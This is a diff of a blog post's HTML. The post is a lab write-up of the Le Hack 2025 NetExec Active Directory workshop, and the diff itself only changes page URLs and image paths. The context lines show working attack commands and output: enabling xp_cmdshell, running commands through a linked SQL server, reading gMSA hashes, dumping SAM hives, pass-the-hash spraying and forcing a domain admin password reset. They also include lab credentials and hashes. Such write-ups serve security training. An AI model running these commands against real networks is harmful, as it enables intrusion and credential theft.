@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en-us">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     <title>Le Hack 2025 - NetExec Workshop 🕷️ // ledrypotato</title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
@@ -17,7 +17,7 @@
   <meta name="twitter:title" content="Le Hack 2025 - NetExec Workshop 🕷️">
   <meta name="twitter:description" content="Active Directory exploitation with NetExec">
 
-    <meta property="og:url" content="http://localhost:1313/posts/le-hack-2025-netexec-workshop/">
+    <meta property="og:url" content="https://ledrypotato.github.io/posts/le-hack-2025-netexec-workshop/">
   <meta property="og:site_name" content="ledrypotato">
   <meta property="og:title" content="Le Hack 2025 - NetExec Workshop 🕷️">
   <meta property="og:description" content="Active Directory exploitation with NetExec">
@@ -235,10 +235,10 @@ rdp
 10.0.0.8 DANTOOINE DANTOOINE.rebels.local
 </code></pre><h2 id="rdp---nlafalse">RDP - <code>(nla:False)</code></h2>
 <p>Something interesting stands out on the RDP protocol:</p>
-<p><img src="_screenshots/Workshop-NetExec-RDP-NLA.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-RDP-NLA.png" alt=""></p>
 <p>There is no NLA (Network Level Authentication) on the <code>MUSTAFAR</code> machine.</p>
 
-        <link rel="stylesheet" href="/css/vendors/admonitions.css">
+          <link rel="stylesheet" href="/css/vendors/admonitions.5c73bad2903e7d2d44ad118370ebd8c2cf5f239d4d93c283e55c00f2f8d30746.css" integrity="sha256-XHO60pA&#43;fS1ErRGDcOvYws9fI51Nk8KD5VwA8vjTB0Y=" crossorigin="anonymous">
   <div class="admonition info">
     <div class="admonition-header">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>
@@ -259,9 +259,9 @@ rdp
 </span></span><span style="display:flex;"><span>RDP         10.0.0.8        <span style="color:#ae81ff">3389</span>   DANTOOINE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
 </span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
 </span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         NLA Screenshot saved /root/.nxc/screenshots/MUSTAFAR_10.0.0.6_2025-06-28_211116.png
-</span></span></code></pre></div><p><img src="_screenshots/Workshop-NetExec-NLA-screenshot.png" alt=""></p>
+</span></span></code></pre></div><p><img src="images/Workshop-NetExec-NLA-screenshot.png" alt=""></p>
 <p>From which we get 2 usernames:</p>
-<p><img src="_screenshots/Workshop-NetExec-RDP-screenshot.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-RDP-screenshot.png" alt=""></p>
 <p>Let&rsquo;s create a file called in <code>users/real.txt</code> with our 2 known usernames:</p>
 <pre tabindex="0"><code>grievousssssss
 krennic
@@ -401,14 +401,14 @@ krennic
 </span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith
 </span></span><span style="display:flex;"><span>ENABLE_C... 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> xp_cmdshell successfully enabled.
 </span></span></code></pre></div><p>NetExec says that the <code>xp_cmdshell</code> was successfully enabled but we can&rsquo;t actually execute any commands with <code>-x &lt;CMD&gt;</code> with our without <code>--local-auth</code> 🤔 (I&rsquo;ll have to look into the module&rsquo;s code to see what&rsquo;s going on):</p>
-<p><img src="_screenshots/Workshop-NetExec-enable-xp_cmdshell.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-enable-xp_cmdshell.png" alt=""></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith --local-auth -x whoami                                                                                     
 </span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
 </span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\k</span>rennic:liu8Sith <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;krennic&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>I ended up wasting almost an hour at this stage since I was convinced that it was the path 😔.</p>
 <h3 id="bloodhound-analysis-">BloodHound Analysis 🐶</h3>
 <p>Back to the BloodHound ingest that we did earlier we can see an interesting path for later on, <code>fn2187</code> can <code>ForceChangePassword</code> over <code>vader</code> who is a Domain Administrator in <code>empire.local</code>:</p>
-<p><img src="_screenshots/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
 <h3 id="bad-successor">Bad Successor?</h3>
 <p>Another recent module implemented by @mpgn is the <a href="https://github.com/Pennyw0rth/NetExec/pull/702">BadSuccessor module</a> based on this recent <a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory">blog post</a> by Akamai. Him and <a href="https://bsky.app/profile/cravaterouge.bsky.social">@CravateRouge</a> talk about the exploit more in detail in his latest <a href="https://open.spotify.com/episode/4aGJcFHrmabIxSBsEN7Zqt?si=6ba3a280b3d44c1a">podcast</a> if you&rsquo;re interested.</p>
 <p>Even though we can&rsquo;t exploit it directly with NetExec I was curious to just try it out and enumerate dMSA objects:</p>
@@ -475,7 +475,7 @@ krennic
 </span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running command on DANTOOINE<span style="color:#ae81ff">\S</span>QLEXPRESS: powershell -c cat /rebels_plan/plans.txt
 </span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command via linked server
 </span></span><span style="display:flex;"><span>LINK_XPCMD  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         Our next base is located in a place called <span style="color:#e6db74">&#34;endor&#34;</span>, this is a top secret information !
-</span></span></code></pre></div><p><img src="_screenshots/Workshop-NetExec-rebel-plan.png" alt=""></p>
+</span></span></code></pre></div><p><img src="images/Workshop-NetExec-rebel-plan.png" alt=""></p>
 <p>If we remember from earlier every machine has the name of a planet we can suppose that <code>endor</code> is referencing another machine? More on this just after.</p>
 <p>We can enumerate users in the other domain:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u <span style="color:#e6db74">&#39;droideka&#39;</span> -p <span style="color:#e6db74">&#39;droideka&#39;</span> --local-auth -M link_xpcmd -o <span style="color:#e6db74">&#39;LINKED_SERVER=DANTOOINE\SQLEXPRESS&#39;</span> CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;powershell -c net users /domain&#39;</span>                                                                                                                            
@@ -526,7 +526,7 @@ krennic
         <p>Remember to specify <code>-k</code> for Kerberos authentication (<a href="https://x.com/filip_dragovic/status/1524730451826511872">https://x.com/filip_dragovic/status/1524730451826511872</a>) ! Thanks to Wilfried again for the hint 😉!</p>
       </div>
   </div>
-<p><img src="_screenshots/Workshop-NetExec-pre2k-with-Kerberos.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-pre2k-with-Kerberos.png" alt=""></p>
 <p>We now have an account in the <code>rebels.local</code> domain:</p>
 <h3 id="credentials----endor">Credentials 🔑 - <code>endor</code></h3>
 <pre tabindex="0"><code>endor$:endor
@@ -559,7 +559,7 @@ krennic
 </span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting GMSA Passwords
 </span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            Account: gMSA-scarif$         NTLM: 889c32ef466ff6b367cf8adf7fce539b     PrincipalsAllowedToReadPassword: ENDOR$
 </span></span></code></pre></div><p>Surprisingly it works, but if we check the BloodHound post workshop it makes sense since <code>endor</code> has the <code>ReadGMSAPassword</code> over <code>gMSA-scarif$</code> as shown below:</p>
-<p><img src="_screenshots/Workshop-NetExec-BloodHound-ReadGMSAPassword.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-BloodHound-ReadGMSAPassword.png" alt=""></p>
 <h3 id="credentials----gmsa-scarif">Credentials 🔑 - <code>gMSA-scarif$</code></h3>
 <pre tabindex="0"><code>gMSA-scarif$:889c32ef466ff6b367cf8adf7fce539b
 </code></pre><h3 id="enumeration-as-gmsa-scarif">Enumeration as <code>gMSA-scarif$</code></h3>
@@ -704,7 +704,7 @@ krennic
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BACKUP_O... 10.0.0.7        445    jedha            [-] Couldn&#39;</span>t save HKLM<span style="color:#ae81ff">\S</span>AM: RRP SessionError: code: 0xb7 - ERROR_ALREADY_EXISTS - Cannot create a file when that file already exists. on path <span style="color:#ae81ff">\\</span>10.0.0.7<span style="color:#ae81ff">\S</span>YSVOL
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">\S</span>AM
 </span></span></code></pre></div><p>Unfortunately I wasn&rsquo;t the first person here 😓 so my dump didn&rsquo;t work as the files already existed in SYSVOL:</p>
-<p><img src="_screenshots/Workshop-NetExec-backup-operator.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-backup-operator.png" alt=""></p>
 <p>I had to download the files that were already accessible on the SYSVOL share then extract the secrets with <code>secretsdump</code> (ok I didn&rsquo;t use <code>nxc</code> for this part 😂).</p>
 <h3 id="secretsdump">Secretsdump</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     
@@ -774,7 +774,7 @@ krennic
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb scope/dc.txt -u users/all-users.txt -H users/hashes.txt
 </span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\f</span>n2187:6bf5bfe70e178247f3d433ce3d02fae4
 </span></span></code></pre></div><p>We get a hit with <code>fn2187</code>, as we saw earlier this account has a path to domain admin since he can change the password of <code>vader</code>:</p>
-<p><img src="_screenshots/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
 <p>Finally we can change <code>vader</code>&rsquo;s password to get domain administrator of <code>empire.local</code> with the <code>change-password</code> module:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.5 -u fn2187 -H 6bf5bfe70e178247f3d433ce3d02fae4 -M change-password -o USER<span style="color:#f92672">=</span>vader NEWPASS<span style="color:#f92672">=</span>potato123!                                                            
 </span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
@@ -793,7 +793,7 @@ krennic
 <p>Huge thanks to <a href="https://x.com/mpgn_x64">@mpgn_x64</a>, <a href="https://x.com/wil_fri3d">@wil_fri3d</a> and <a href="https://x.com/_zblurx">@_zblurx</a> for organizing this workshop for yet another year. I&rsquo;m pleased that I managed to complete both domains this year 😁!</p>
 <p>Congratulations to <a href="https://x.com/LeandreOnizuka">@LeandreOnizuka</a> for the first place 🏆 and <a href="https://x.com/wfrnds1">wfrnds1</a> for the second place!</p>
 <p>I ended up completing the lab in just under 5 hours as you can see from the timestamp below:</p>
-<p><img src="_screenshots/Workshop-NetExec-NTDS-owned.png" alt=""></p>
+<p><img src="images/Workshop-NetExec-NTDS-owned.png" alt=""></p>
 <p>Hopefully I do better next year and maybe get a place on the podium 🤞 (and a seat in the workshop room if there is more space and plugs to charge my laptop 🤣. I ended up squatting the DGSE&rsquo;s stand 😎)!</p>
 <p>Nonetheless I learnt to use a bunch of different/new modules/flags that I had never tested before such as:</p>
 <ul>
